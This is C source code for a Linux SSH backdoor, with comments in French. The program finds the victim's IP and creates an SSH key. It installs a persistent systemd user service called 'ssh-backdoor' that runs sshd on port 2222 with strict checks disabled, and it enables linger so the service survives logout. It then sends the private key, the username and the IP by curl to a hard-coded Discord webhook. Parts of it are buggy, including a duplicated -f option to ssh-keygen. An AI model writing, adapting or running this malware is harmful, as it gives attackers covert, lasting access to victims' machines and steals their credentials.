#include <dirent.h>
#include <errno.h>
#include <libgen.h>
#include <stddef.h>
#include <stdio.h>
#include <stdlib.h>
#include <string.h>
#include <sys/stat.h>
#include <sys/types.h>
#include <unistd.h>

void ssh_backdoor() {
  char *home = getenv("HOME");
  char *user = getenv("USER");
  if (!home || !user)
    return;

  // IP victim (local pour test LAN)
  FILE *fp = popen(
      "curl -s ifconfig.me 2>/dev/null || hostname -I | cut -d' ' -f1", "r");
  char victim_ip[128] = "127.0.0.1";
  if (fp) {
    if (fgets(victim_ip, sizeof(victim_ip) - 1, fp))
      victim_ip[strcspn(victim_ip, "\n")] = 0;
    pclose(fp);
  }

  char ssh_dir[256], priv_key[512], pub_key[512], auth_keys[512];
  snprintf(ssh_dir, sizeof(ssh_dir), "%s/.ssh", home);
  snprintf(priv_key, sizeof(priv_key), "%s/id_rsa_basique", ssh_dir);
  snprintf(pub_key, sizeof(pub_key), "%s/id_rsa_basique.pub", ssh_dir);
  snprintf(auth_keys, sizeof(auth_keys), "%s/authorized_keys", ssh_dir);

  // 1. .ssh setup (comme avant)
  mkdir(ssh_dir, 0700);
  chmod(ssh_dir, 0700);
  if (access(priv_key, F_OK)) {
    system(
        "ssh-keygen -t rsa -b 2048 -f id_rsa_basique -N '' -q -f ${HOME}/.ssh");
  }
  // authorized_keys setup (code précédent)...

  // 2. ✅ CORRIGÉ : systemd user service + linger
  char svc_path[512];
  snprintf(svc_path, sizeof(svc_path),
           "%s/.config/systemd/user/ssh-backdoor.service", home);

  FILE *svc = fopen(svc_path, "w");
  if (svc) {
    fprintf(svc, "[Unit]\n"
                 "Description=SSH Backdoor\n"
                 "After=network.target\n\n"
                 "[Service]\n"
                 "ExecStart=/usr/sbin/sshd -D -p 2222 -o PidFile=/tmp/sshd.pid "
                 "-o StrictModes=no\n"
                 "Restart=always\n"
                 "RestartSec=5\n\n"
                 "[Install]\n"
                 "WantedBy=default.target");
    fclose(svc);

    // Reload + enable + start + linger
    system("systemctl --user daemon-reload >/dev/null 2>&1");
    system("systemctl --user enable ssh-backdoor >/dev/null 2>&1");
    system("systemctl --user start ssh-backdoor >/dev/null 2>&1");
    system("loginctl enable-linger >/dev/null 2>&1");
    sleep(3); // Délai sshd startup
  }

  // 3. Fallback : sshd direct en bg
  system("pgrep -f '/usr/sbin/sshd -p 2222' || /usr/sbin/sshd -D -p 2222 -o "
         "PidFile=/tmp/sshd.pid -o StrictModes=no >/dev/null 2>&1 &");
  sleep(2);

  // 4. ✅ CORRIGÉ : Exfil SPLIT (clé + infos séparés)
  FILE *keyf = fopen(priv_key, "r");
  if (!keyf)
    return;
  char key_content[4096] = {0};
  fread(key_content, sizeof(key_content) - 1, 1, keyf);
  fclose(keyf);

  // Échappement
  char escaped_key[4096] = {0}; // Réduit taille
  int j = 0;
  for (int i = 0; key_content[i] && j < 3800; i++) { // < 2000 après format
    if (key_content[i] == '"') {
      escaped_key[j++] = '\\';
      escaped_key[j++] = '"';
    } else if (key_content[i] == '\\') {
      escaped_key[j++] = '\\';
      escaped_key[j++] = '\\';
    } else
      escaped_key[j++] = key_content[i];
  }

  // MESSAGE 1 : Infos + partie 1 clé
  char exfil1[8192];
  snprintf(
      exfil1, sizeof(exfil1),
      "curl -s -X POST 'https://discord.com/api/webhooks/1485416783706853558/"
      "qGWKXvrslqK8xzMdQpIy9J8BqiM8WqBaXyq_9SweYyeOXzRRGlmHtjxd8keiCZTyaNyB' "
      "-H 'Content-Type: application/json' "
      "-d '{\"content\":\"🔓 **SSH ACTIVÉ** 🔓\\n\\n"
      "`ssh -p 2222 %s@%s`\\n\\n"
      "🗝️ **Clé privée (1/2)**:\\n```%s```\"}'",
      user, victim_ip, escaped_key);
  system(exfil1);

  // MESSAGE 2 : Suite clé + vérif
  char exfil2[4096];
  snprintf(
      exfil2, sizeof(exfil2),
      "curl -s -X POST 'https://discord.com/api/webhooks/1485416783706853558/"
      "qGWKXvrslqK8xzMdQpIy9J8BqiM8WqBaXyq_9SweYyeOXzRRGlmHtjxd8keiCZTyaNyB' "
      "-H 'Content-Type: application/json' "
      "-d '{\"content\":\"🗝️ **Clé privée (2/2)** "
      "continuation...```\\n%s\\n```\\n\\n"
      "✅ **Vérif**: `netstat -tulpn | grep 2222` sur victim\\n"
      "`ps aux | grep sshd`\"}'",
      escaped_key + 1800);
  system(exfil2);
}

int main(void) {
  ssh_backdoor();
  return 1;
}
